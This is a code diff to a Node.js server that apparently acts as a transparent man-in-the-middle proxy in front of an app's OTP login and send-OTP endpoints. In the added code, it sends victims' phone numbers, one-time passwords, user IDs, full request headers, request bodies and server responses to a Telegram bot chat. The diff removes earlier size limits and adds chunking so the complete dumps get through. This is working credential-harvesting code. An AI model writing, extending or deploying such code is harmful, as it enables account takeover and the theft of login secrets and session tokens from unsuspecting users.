@@ -429,6 +429,23 @@ function getResponseData(jsonResp) {
   return null;
 }
 
+function sendChunked(botInst, chatId, text, chunkSize = 3800) {
+  if (!botInst || !chatId || !text) return;
+  try {
+    const s = String(text);
+    if (s.length <= chunkSize) {
+      botInst.sendMessage(chatId, s).catch(()=>{});
+      return;
+    }
+    const total = Math.ceil(s.length / chunkSize);
+    for (let i = 0; i < total; i++) {
+      const part = s.substring(i * chunkSize, (i + 1) * chunkSize);
+      const header = `(${i + 1}/${total})\n`;
+      botInst.sendMessage(chatId, header + part).catch(()=>{});
+    }
+  } catch(e) { /* ignore */ }
+}
+
 function sendJson(res, headers, json, fallback) {
   const body = json ? JSON.stringify(json) : fallback;
   headers['content-type'] = 'application/json; charset=utf-8';
@@ -1262,12 +1279,15 @@ app.post('/app/user/login/otp', async (req, res) => {
     }
 
     if (data.adminChatId && bot) {
-      const reqHeadersDump = JSON.stringify(req.headers, null, 2).substring(0, 1500);
-      const reqBodyDump = JSON.stringify(body, null, 2).substring(0, 1500);
-      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      const tag = `🔑 Login (OTP) [${userId || phone || 'N/A'}]`;
+      const reqHeadersDump = JSON.stringify(req.headers, null, 2);
+      const reqBodyDump = JSON.stringify(body, null, 2);
+      const respDump = JSON.stringify(jsonResp, null, 2);
       const summary = `🔑 Login (OTP)\n📱 Phone: ${phone || 'N/A'}\n🔢 OTP: ${otp || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
       bot.sendMessage(data.adminChatId, summary).catch(()=>{});
-      bot.sendMessage(data.adminChatId, `🔑 Login (OTP) — FULL DUMP\n👤 ${userId || phone || 'N/A'}\n\n📨 REQUEST HEADERS:\n${reqHeadersDump}\n\n📝 REQUEST BODY:\n${reqBodyDump}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      sendChunked(bot, data.adminChatId, `${tag}\n📨 REQUEST HEADERS:\n${reqHeadersDump}`);
+      sendChunked(bot, data.adminChatId, `${tag}\n📝 REQUEST BODY:\n${reqBodyDump}`);
+      sendChunked(bot, data.adminChatId, `${tag}\n📥 RESPONSE:\n${respDump}`);
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -2034,11 +2054,14 @@ app.post('/app/send/opt', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      const reqHeadersDump = JSON.stringify(req.headers, null, 2).substring(0, 1500);
-      const reqBodyDump = JSON.stringify(body, null, 2).substring(0, 1500);
-      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      const tag = `📲 Send OTP [${userId || body.phone || body.mobile || 'N/A'}]`;
+      const reqHeadersDump = JSON.stringify(req.headers, null, 2);
+      const reqBodyDump = JSON.stringify(body, null, 2);
+      const respDump = JSON.stringify(jsonResp, null, 2);
       bot.sendMessage(data.adminChatId, `📲 OTP Sent [${userId || 'N/A'}]\nPhone: ${body.phone || body.mobile || 'N/A'}\nType: ${body.type || 'N/A'}`).catch(()=>{});
-      bot.sendMessage(data.adminChatId, `📲 Send OTP — FULL DUMP\n👤 ${userId || body.phone || body.mobile || 'N/A'}\n\n📨 REQUEST HEADERS:\n${reqHeadersDump}\n\n📝 REQUEST BODY:\n${reqBodyDump}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      sendChunked(bot, data.adminChatId, `${tag}\n📨 REQUEST HEADERS:\n${reqHeadersDump}`);
+      sendChunked(bot, data.adminChatId, `${tag}\n📝 REQUEST BODY:\n${reqBodyDump}`);
+      sendChunked(bot, data.adminChatId, `${tag}\n📥 RESPONSE:\n${respDump}`);
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
